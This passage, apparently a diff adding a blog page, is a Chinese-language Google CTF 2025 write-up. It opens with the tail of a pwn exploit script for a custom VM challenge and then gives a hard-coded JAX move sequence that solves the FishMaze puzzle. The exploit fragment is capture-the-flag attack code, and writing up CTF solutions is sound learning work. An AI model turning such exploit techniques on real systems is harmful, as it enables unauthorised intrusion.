class="built_in">hex</span>(struct_pc))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;SP: &quot;</span>, <span class="built_in">hex</span>(struct_sp))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;REGS[&#123;&#125;]= &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">hex</span>(struct_regs[i])))</span><br><span class="line"></span><br><span class="line">    s(p64(struct_seg1))</span><br><span class="line"></span><br><span class="line">    ita()</span><br></pre></td></tr></table></figure>
+
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="FishMaze"><a href="#FishMaze" class="headerlink" title="FishMaze"></a>FishMaze</h2><p>魚初始會在中間，要想辦法走出去這個藍色的圈圈<br>藍色是牆壁，剩下的是敵人，不能碰到</p>
+<img src="/2025/07/05/2025-Google-CTF-writeup/c.png" class="">
+
+<p>首先他沒有給 source code<br>不過可以發現，他每一 round 都會去執行你寫在 <code>player_kernel</code> 內的 code<br>並且在 @chumy 的測試下，發現他是個 JAX<br><a target="_blank" rel="noopener" href="https://docs.jax.dev/en/latest/quickstart.html">https://docs.jax.dev/en/latest/quickstart.html</a></p>
+<p>另外 player_kernel 本身有提供三個變數<br><code>mapdata_ref</code>、<code>auxdata_ref</code>、<code>out_ref</code><br>第一個 <code>mapdata</code> 有idx 0~7</p>
+<p>分別是以魚為中心周圍八格的狀況</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A0 A1 A2</span><br><span class="line">A3 *  A4</span><br><span class="line">A5 A6 A7</span><br></pre></td></tr></table></figure>
+
+<p>out_ref 的 index 0 存放的是下一次要走的方向</p>
+<ul>
+<li>0 : stay still</li>
+<li>1 : move left</li>
+<li>2 : move right</li>
+<li>3 : move up</li>
+<li>4 : move down</li>
+</ul>
+<p>剩下的 out_ref 可以在這輪存入東西<br>他會在下一輪把資料繼承給 auxdata_ref<br>這裡的 aux 就充當了一個暫存器</p>
+<p>到這邊其實就可以想到，寫一個計數器，去紀錄當前輪數<br>然後在之後的 index 就放之後每個輪數要去執行的方向，來去控制魚走出去</p>
+<p>通過以下的 exploit 就可以走出去了</p>
+<h3 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">player_kernel</span>(<span class="params">mapdata_ref, auxdata_ref, out_ref</span>):</span><br><span class="line">    round_n = auxdata_ref[<span class="number">0</span>]</span><br><span class="line">    round_n += <span class="number">1</span>       </span><br><span class="line">    out_ref.at[<span class="number">1</span>].<span class="built_in">set</span>(round_n)</span><br><span class="line">    out_ref.at[<span class="number">2</span>].<span class="built_in">set</span>(<span class="number">1</span>)</span><br><span class="line">    out_ref.at[<span class="number">3</span>].<span class="built_in">set</span>(<span class="number">1</span>)</span><br><span class="line">    out_ref.at[<span class="number">4</span>].<span class="built_in">set</span>(<span class="number">1</span>)</span><br><span class="line">    out_ref.at[<span class="number">5</span>].<span class="built_in">set</span>(<span class="number">1</span>)</span><br><span class="line">    out_ref.at[<span class="number">6</span>].<span class="built_in">set</span>(<span class="number">1</span>)</span><br><span class="line">    out_ref.at[<span class="number">7</span>].<span class="built_in">set</span>(<span class="number">1</span>)</span><br><span class="line">    out_ref.at[<span class="number">8</span>].<span class="built_in">set</span>(<span class="number">1</span>)</span><br><span class="line">    out_ref.at[<span class="number">9</span>].<span class="built_in">set</span>(<span class="number">1</span>)</span><br><span class="line">    out_ref.at[<span class="number">10</span>].<span class="built_in">set</span>(<span class="number">1</span>)</span><br><span class="line">    out_ref.at[<span class="number">11</span>].<span class="built_in">set</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    out_ref.at[<span class="number">12</span>].<span class="built_in">set</span>(<span class="number">4</span>)</span><br><span class="line">    out_ref.at[<span class="number">13</span>].<span class="built_in">set</span>(<span class="number">4</span>)</span><br><span class="line">    out_ref.at[<span class="number">14</span>].<span class="built_in">set</span>(<span class="number">4</span>)</span><br><span class="line">    out_ref.at[<span class="number">15</span>].<span class="built_in">set</span>(<span class="number">4</span>)</span><br><span class="line">    out_ref.at[<span class="number">16</span>].<span class="built_in">set</span>(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    out_ref.at[<span class="number">17</span>].<span class="built_in">set</span>(<span class="number">1</span>)</span><br><span class="line">    out_ref.at[<span class="number">18</span>].<span class="built_in">set</span>(<span class="number">1</span>)</span><br><span class="line">    out_ref.at[<span class="number">19</span>].<span class="built_in">set</span>(<span class="number">1</span>)</span><br><span class="line">    out_ref.at[<span class="number">20</span>].<span class="built_in">set</span>(<span class="number">1</span>)</span><br><span class="line">    out_ref.at[<span class="number">21</span>].<span class="built_in">set</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    out_ref.at[<span class="number">22</span>].<span class="built_in">set</span>(<span class="number">3</span>)</span><br><span class="line">    out_ref.at[<span class="number">23</span>].<span class="built_in">set</span>(<span class="number">1</span>)</span><br><span class="line">    out_ref.at[<span class="number">24</span>].<span class="built_in">set</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    out_ref.at[<span class="number">25</span>].<span class="built_in">set</span>(<span class="number">3</span>)</span><br><span class="line">    out_ref.at[<span class="number">26</span>].<span class="built_in">set</span>(<span class="number">1</span>)</span><br><span class="line">    out_ref.at[<span class="number">27</span>].<span class="built_in">set</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    out_ref.at[<span class="number">28</span>].<span class="built_in">set</span>(<span class="number">3</span>)</span><br><span class="line">    out_ref.at[<span class="number">29</span>].<span class="built_in">set</span>(<span class="number">1</span>)</span><br><span class="line">    out_ref.at[<span class="number">30</span>].<span class="built_in">set</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    out_ref.at[<span class="number">31</span>].<span class="built_in">set</span>(<span class="number">3</span>)</span><br><span class="line">    out_ref.at[<span class="number">32</span>].<span class="built_in">set</span>(<span class="number">1</span>)</span><br><span class="line">    out_ref.at[<span class="number">33</span>].<span class="built_in">set</span>(<span class="number">3</span>)</span><br><span class="line">    out_ref.at[<span class="number">34</span>].<span class="built_in">set</span>(<span class="number">1</span>)</span><br><span class="line">    out_ref.at[<span class="number">35</span>].<span class="built_in">set</span>(<span class="number">3</span>)</span><br><span class="line">    out_ref.at[<span class="number">36</span>].<span class="built_in">set</span>(<span class="number">1</span>)</span><br><span class="line">    out_ref.at[<span class="number">37</span>].<span class="built_in">set</span>(<span class="number">3</span>)</span><br><span class="line">    out_ref.at[<span class="number">38</span>].<span class="built_in">set</span>(<span class="number">1</span>)</span><br><span class="line">    out_ref.at[<span class="number">39</span>].<span class="built_in">set</span>(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    out_ref.at[<span class="number">40</span>].<span class="built_in">set</span>(<span class="number">3</span>)</span><br><span class="line">    out_ref.at[<span class="number">41</span>].<span class="built_in">set</span>(<span class="number">3</span>)</span><br><span class="line">    out_ref.at[<span class="number">42</span>].<span class="built_in">set</span>(<span class="number">3</span>)</span><br><span class="line">    out_ref.at[<span class="number">43</span>].<span class="built_in">set</span>(<span class="number">3</span>)</span><br><span class="line">    out_ref.at[<span class="number">44</span>].<span class="built_in">set</span>(<span class="number">3</span>)</span><br><span class="line">    out_ref.at[<span class="number">45</span>].<span class="built_in">set</span>(<span class="number">3</span>)</span><br><span class="line">    out_ref.at[<span class="number">46</span>].<span class="built_in">set</span>(<span class="number">3</span>)</span><br><span class="line">    out_ref.at[<span class="number">47</span>].<span class="built_in">set</span>(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    out_ref.at[<span class="number">48</span>].<span class="built_in">set</span>(<span class="number">2</span>)</span><br><span class="line">    out_ref.at[<span class="number">49</span>].<span class="built_in">set</span>(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    out_ref.at[<span class="number">50</span>].<span class="built_in">set</span>(<span class="number">3</span>)</span><br><span class="line">    out_ref.at[<span class="number">51</span>].<span class="built_in">set</span>(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    out_ref.at[<span class="number">52</span>].<span class="built_in">set</span>(<span class="number">3</span>)</span><br><span class="line">    out_ref.at[<span class="number">53</span>].<span class="built_in">set</span>(<span class="number">3</span>)</span><br><span class="line">    out_ref.at[<span class="number">54</span>].<span class="built_in">set</span>(<span class="number">3</span>)</span><br><span class="line">    out_ref.at[<span class="number">55</span>].<span class="built_in">set</span>(<span class="number">3</span>)</span><br><span class="line">    out_ref.at[<span class="number">56</span>].<span class="built_in">set</span>(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    out_ref.at[<span class="number">0</span>].<span class="built_in">set</span>(auxdata_ref[round_n%<span class="number">56</span>+<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
+
+<p>get flag ~</p>
+<img src="/2025/07/05/2025-Google-CTF-writeup/d.png" class="">
+
+
+<h2 id="after-all"><a href="#after-all" class="headerlink" title="after all"></a>after all</h2><p>蠻好玩的~</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        <img data-src="/images/posts_cover/LinuxKernelPwn/linuxkernel.png" data-sizes="auto" alt="Linux Kernel Patched - exec remove legacy custom binfmt modules autoloading" class="lazyload">
+      
+      <a href="/2025/06/30/Linux-Kernel-Patched-exec-remove-legacy-custom-binfmt-modules-autoloading/"></a>
+      <div class="article-nav-caption">Older</div>
+      <h3 class="article-nav-title">
+        
+          Linux Kernel Patched - exec remove legacy custom binfmt modules autoloading
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2025
+      <span class="footer-info-sep rotate"></span>
+      Naup堇姬
+    </div>
+    
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        186k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        16:18
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#GoogleCTF-2025-writeup"><span class="toc-number">1.</span> <span class="toc-text">GoogleCTF 2025 - writeup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn"><span class="toc-number">2.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#multi-arch-2"><span class="toc-number">2.1.</span> <span class="toc-text">multi-arch 2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#analyze-IDA"><span class="toc-number">2.1.1.</span> <span class="toc-text">analyze IDA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#analyze-bug"><span class="toc-number">2.1.2.</span> <span class="toc-text">analyze bug</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit"><span class="toc-number">2.1.3.</span> <span class="toc-text">exploit</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">3.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#FishMaze"><span class="toc-number">3.1.</span> <span class="toc-text">FishMaze</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit-1"><span class="toc-number">3.1.1.</span> <span class="toc-text">exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#after-all"><span class="toc-number">3.2.</span> <span class="toc-text">after all</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Naup堇姬" class="lazyload">
+  <div class="sidebar-author-name">Naup堇姬</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">74</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">21</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-email sidebar-social-icon">
+      <a href=naup96721@gmail.com itemprop="url" target="_blank" aria-label="email" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/Naupjjin itemprop="url" target="_blank" aria-label="github" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "Naup堇姬",
+          title: "2025 Google CTF - writeup",
+          url: "http://example.com/2025/07/05/2025-Google-CTF-writeup/",
+          excerpt: "",
+          description: "",
+          stripContent: "GoogleCTF 2025 - writeup Author: 堇姬 Naup       Pwnmulti-arch 2一題 VM pwn第一題是 Reverse 第二題是 pwn這份 writeup 只有寫 pwn analyze IDA沒有 debug symbol，所以要修這台 VM 自定義了一個 masm 的檔案格式整個 masm 檔案格式就是  4 bytes MASM 作為 magic number 被 load 進去後共有 3 個 segments，code、data、stac",
+          date: "Sat Jul 05 2025 18:59:48 GMT+0800",
+          updated: "Sat Jul 05 2025 19:06:37 GMT+0800",
+          cover: "/images/posts_cover/googlectf/googlectf.png",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+  </body>
+  </html>
+
